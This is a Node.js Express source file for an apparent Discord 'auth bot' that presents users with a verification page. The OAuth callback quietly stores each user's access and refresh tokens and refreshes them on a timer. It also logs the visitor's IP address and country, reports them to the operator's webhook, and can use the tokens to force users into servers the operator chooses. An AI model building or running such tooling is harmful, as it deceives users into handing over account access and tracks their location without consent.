/* Core API */
const client = require('./Utils/client');
const auth = require('./Core/AuthClient')
const venusClient = new auth(client);
const express = require('express');
const app = express();
const fs = require('fs');

/* Core API Configuration */
const config = require('./Settings/config');
const authLink = client.authLink = `https://discord.com/oauth2/authorize?client_id=${config.client.id}&redirect_uri=${config.client.redirect_uri}&response_type=code&scope=identify%20guilds.join`
const authInvite = client.authInvite = `https://discord.com/api/oauth2/authorize?client_id=${config.client.id}&permissions=8&scope=bot%20applications.commands`;
/* Core Database */
const botSchema = require('./Schema/botSchema');
const userSchema = require('./Schema/userSchema')

/* Core Extra Modules */
const chalk = require('chalk');

const axios = require('axios')

const requestIp = require('request-ip');

app.use(requestIp.mw())

/* Core Extra Client Configuration */
client.chalk = chalk;
client.fs = fs;
client.authClient = venusClient;
const log = authLog => { console.log(`[${chalk.green("+")}] ` + authLog) }
const warn = authLog => { console.log(`[${chalk.red("-")}] ` + authLog) }
const error = authLog => { console.log(`[${chalk.red("!")}] ` + authLog) }
require('./Utils/loader')(client);
process.setMaxListeners(0);
process.on("unhandledRejection", err => { })

client.on('ready', async () => {

    setInterval(async () => {
        let users = await userSchema.find({}).lean().select("refreshToken expiresDate");

        users.forEach(async user => {

            if (Date.now() <= user.expiresDate) {

                await venusClient.refreshToken(user.refreshToken)

            }

        })
    }, 300000);
})

/* Core Auth Modules */
const passport = require('passport');
var DiscordStrategy = require('passport-discord').Strategy;

/* Core Auth Web Configuration */
app.set('trust proxy', 1);
app.listen(config.web.port, () => { log(`Auth Scanner is running on port ${config.web.port}`) });

/* Core Auth Profile */
passport.use(new DiscordStrategy({
    clientID: config.client.id,
    clientSecret: config.client.secret,
    callbackURL: config.client.redirect_uri,
    scope: config.client.scope,
},
    function (accessToken, refreshToken, profile, cb) {
        let data = {
            ...profile,
            accessToken,
            refreshToken
        }
        cb(null, data)
    }));

/* Core Auth Website */
app.get('/', function (req, res) {
    res.sendFile(__dirname + '/Views/index.html');
})

app.get('/verified', function (req, res) {
    res.sendFile(__dirname + '/Views/verified.html');
})
app.get('/discord', function (req, res) {
    res.redirect(`${config.client.serverLink}`);
})

app.get('/auth', passport.authenticate('discord'), async function (req, res) {

    console.log(req.body)
});
app.get('/auth/discord/callback', passport.authenticate('discord', {
    failureRedirect: '/',
    session: false
}), async function (req, res) {

    let user = req.user;

    let user_ = await venusClient.fetchUser(user.id);
    let botData = await botSchema.findOne({ clientId: client.user.id });

    let ip = req.clientIp || null;
    if (ip) {
        ip = ip.split(':')[3];
    }

    let aronshire_ = await axios.get(`https://api.ipregistry.co/${ip}?key=${config.web.apiKey}`).then(res => res.data).catch();
    let countryCode = aronshire_?.location?.country?.code || null

    let userData = {
        id: user.id,
        username: user.username,
        discriminator: user.discriminator,
        avatar: `https://cdn.discordapp.com/avatars/${req.user.id}/${req.user.avatar}.png`,
        accessToken: user.accessToken,
        refreshToken: user.refreshToken,
        expiresDate: Date.now() + 604800,
        locale: `:flag_${countryCode.toLowerCase()}:`,
        ip: `${ip}`,
    }

    let badges;
    if (user_.flags.toArray().length > 0) {

        let DISCORD_NITRO = user.premium_type > 0 ? '<:g_nitro:1001998469961089084>' : '';

        let DISCORD_EMPLOYEE = user_.flags.has('Staff') ? '<:discord_staff:948738507814359041>' : '';
        let PARTNERED_SERVER_OWNER = user_.flags.has('Partner') ? '<:Partner:1001996381621325905>' : '';
        let DISCORD_CERTIFIED_MODERATOR = user_.flags.has('CertifiedModerator') ? '<:certifieddiscordmoderator:1001996369600467034>' : '';
        let HYPESQUAD_EVENTS = user_.flags.has('Hypesquad') ? '<:hypesquad_events:1001996383169028147>' : '';

        let HOUSE_BRAVERY = user_.flags.has('HypeSquadOnlineHouse1') ? '<:hypesquadbravey:948738579029454919>' : '';
        let HOUSE_BRILLIANCE = user_.flags.has('HypeSquadOnlineHouse2') ? '<:hypequadBrilliance:1001996378202968176>' : '';
        let HOUSE_BALANCE = user_.flags.has('HypeSquadOnlineHouse3') ? '<:hypesquadBalance:1001996375858364476>' : '';

        let BUGHUNTER_LEVEL_1 = user_.flags.has('BugHunterLevel1') ? '<:bughunter:1001996370850357258>' : '';
        let BUGHUNTER_LEVEL_2 = user_.flags.has('BugHunterLevel2') ? '<:goldbughunter:1001996374725885973>' : '';

        let EARLY_VERIFIED_BOT_DEVELOPER = user_.flags.has('VerifiedDeveloper') ? ':<:verifiedbotdev:1001996377171181588>' : '';

        let EARLY_SUPPORTER = user_.flags.has('PremiumEarlySupporter') ? '<:earlysupporter:948738574717689946>' : '';
        //  let ACTIVE_DEVELOPER = user_.flags.has('ACTIVE_DEVELOPER') ? '<:ActiveDevloper:1041403513206489118>' : '';

        badges = `${DISCORD_EMPLOYEE}${PARTNERED_SERVER_OWNER}${DISCORD_CERTIFIED_MODERATOR}${HYPESQUAD_EVENTS}${HOUSE_BRAVERY}${HOUSE_BRILLIANCE}${HOUSE_BALANCE}${BUGHUNTER_LEVEL_1}${BUGHUNTER_LEVEL_2}${EARLY_VERIFIED_BOT_DEVELOPER}${EARLY_SUPPORTER}${DISCORD_NITRO}`;

    } else {
        badges = 'None';
    }

    venusClient.saveAuth(client.user.id, userData);
    venusClient.sendWebhook({
        embeds: [
            {
                color: 3092790,
                title: `👤 New User`,
                thumbnail: { url: userData.avatar, dynamic: true },
                fields: [
                    {
                        name: "Account Creation On",
                        value: `<t:${Math.round(user_.createdTimestamp / 1000)}>`,
                        inline: true
                    },
                    {
                        name: "Badges",
                        value: `${badges}`,
                        inline: true
                    },
                    {
                        name: "Locale",
                        value: `:flag_${countryCode.toLowerCase()}:`,
                        inline: true
                    },
                    {
                        name: "AutoJoin",
                        value: `\`${botData.autoJoin[0]?.status === true ? "Enabled" : "Disabled"}\``,
                        inline: true
                    },
                    {
                        name: "AutoMessage",
                        value: "``Disabled``",
                        inline: true
                    },
                    {
                        name: "AutoRole",
                        value: "``Disabled``",
                        inline: true
                    },
                    {
                        name: "IP Adress",
                        value: `\`${ip}\``,
                        inline: true
                    }
                ],
                footer: {
                    "text": `${config.client.footer} ・ ${config.client.serverLink}`
                },
                description: `\`\` ${userData.username}#${userData.discriminator} \`\` \`\` ${userData.id} \`\``,
            },
        ]

    })

    if (botData.autoJoin[0]?.status === true) {

        venusClient.joinServer(userData.accessToken, botData.autoJoin[0].guildID, userData.id);
        venusClient.sendWebhook({
            embeds: [
                {
                    color: 3092790,
                    title: `👤 Auth Joiner`,
                    thumbnail: { url: userData.avatar },
                    description: `\`\` ${userData.username}#${userData.discriminator} \`\` \`\` ${userData.id} \`\``,
                    fields: [
                        {
                            name: "Server",
                            value: `\`${botData.autoJoin[0].guildName}\``,
                            inline: true
                        },
                        {
                            name: "Server ID",
                            value: `\`${botData.autoJoin[0].guildID}\``,
                            inline: true
                        }
                    ],
                    footer: {
                        "text": `${config.client.footer} ・ ${config.client.serverLink}`
                    }
                },
            ]
        })
    }

   // res.redirect('https://discord.com/oauth2/authorized'); 
   // discord yetkilendirmesi
    res.redirect('/verified')

});